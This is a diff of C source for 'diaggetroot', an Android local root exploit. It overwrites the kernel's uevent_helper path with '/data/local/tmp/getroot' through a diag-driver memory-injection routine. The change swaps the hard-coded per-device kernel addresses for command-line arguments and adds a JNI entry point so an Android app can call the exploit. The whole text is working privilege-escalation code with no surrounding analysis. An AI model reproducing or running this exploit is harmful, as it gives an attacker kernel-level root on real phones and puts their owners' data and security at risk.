@@ -29,9 +29,12 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
+#include <stdbool.h>
 #include <unistd.h>
 #include <jni.h>
 #include <sys/mman.h>
+
+#include "diag.h"
 
 #define  LOG_TAG    "diaggetroot"
 #define  LOGI(...)  __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
@@ -41,15 +44,6 @@
 #include <android/log.h>
 
 //unsigned address = 0xc0d0dfd0; //htc batterfly
-//#define UEVENT_HELPER_ADDRESS 0xc0b6cc38; // Xperia SX 113
-#define UEVENT_HELPER_ADDRESS 0xc0c90fac; // SC-05D SC05DOMLPL
-
-struct values {
-  unsigned addr;
-  unsigned short value;
-};
-
-extern int inject(void *adr, int value, int fd);
 
 static int
 cmpare(const void *a , const void *b) {
@@ -64,45 +58,88 @@ cmpare(const void *a , const void *b) {
   return 1;
 }
 
-static void
-uevent_helper_mod(int fd)
+static int
+prepare_injection_data(struct values *data, size_t data_size,
+                       unsigned int uevent_helper_address)
 {
-  unsigned address = UEVENT_HELPER_ADDRESS;
   const char path[]="/data/local/tmp/getroot";
-  struct values data[400];
   int i, data_length;
 
-  for (i = 0, data_length = 0; i < sizeof(path); i += 2) {
-    data[data_length].addr = address + i;
+  for (i = 0, data_length = 0; i < sizeof(path) && i < data_size; i += 2) {
+    data[data_length].address = uevent_helper_address + i;
     data[data_length].value = path[i] | (path[i + 1] << 8);
     data_length++;
   }
 
   qsort(data, data_length, sizeof(struct values), cmpare);
-
-  for (i = 0; i < data_length; i++) {
-    LOGD("data[%d] addr=%x value=%x (%c%c)",
-         i, data[i].addr, data[i].value,
-         data[i].value & 0xff, data[i].value >> 8);
-    inject((void*)data[i].addr, data[i].value, fd);
-  }
+  return data_length;
 }
 
-void
+static bool
+inject_getroot_command_with_fd(unsigned int uevent_helper_address,
+                               unsigned int delayed_rsp_id_address,
+                               int fd)
+{
+  struct values data[400];
+  int data_length;
+
+  data_length = prepare_injection_data(data, sizeof(data), uevent_helper_address);
+
+  return inject_with_file_descriptor(data, data_length, delayed_rsp_id_address, fd) == 0;
+}
+
+static bool
+inject_uevent_helper(unsigned int uevent_helper_address,
+                     unsigned int delayed_rsp_id_address)
+{
+  struct values data[400];
+  int data_length;
+
+  data_length = prepare_injection_data(data, sizeof(data), uevent_helper_address);
+
+  return inject(data, data_length, delayed_rsp_id_address) == 0;
+}
+
+jboolean
 Java_com_example_diaggetroot_MainActivity_getrootnative(JNIEnv *env,
                                                         jobject thiz,
-                                                        int fd)
+                                                        int fd,
+                                                        unsigned int uevent_helper_address,
+                                                        unsigned int delayed_rsp_id_address)
 {
-  uevent_helper_mod(fd);
+  return inject_getroot_command_with_fd(uevent_helper_address, delayed_rsp_id_address, fd);
+}
+
+static void
+usage()
+{
+  int i;
+
+  printf("Usage:\n");
+  printf("\tdiaggetroot [uevent_helper address] [delayed_rsp_id address]\n");
 }
 
 int
 main (int argc, char **argv)
 {
-  uevent_helper_mod(0);
-  return 0;
-}
+  int ret;
+  unsigned long int uevent_helper;
+  unsigned long int delayed_rsp_id;
 
+  if (argc != 3) {
+    usage();
+    exit(EXIT_FAILURE);
+  }
+
+  uevent_helper = strtoul(argv[1], NULL, 16);
+  delayed_rsp_id = strtoul(argv[2], NULL, 16);
+
+  if (!inject_uevent_helper(uevent_helper, delayed_rsp_id)) {
+    exit(EXIT_FAILURE);
+  }
+
+  exit(EXIT_SUCCESS);
+}
 /*
 vi:ts=2:nowrap:ai:expandtab:sw=2
 */
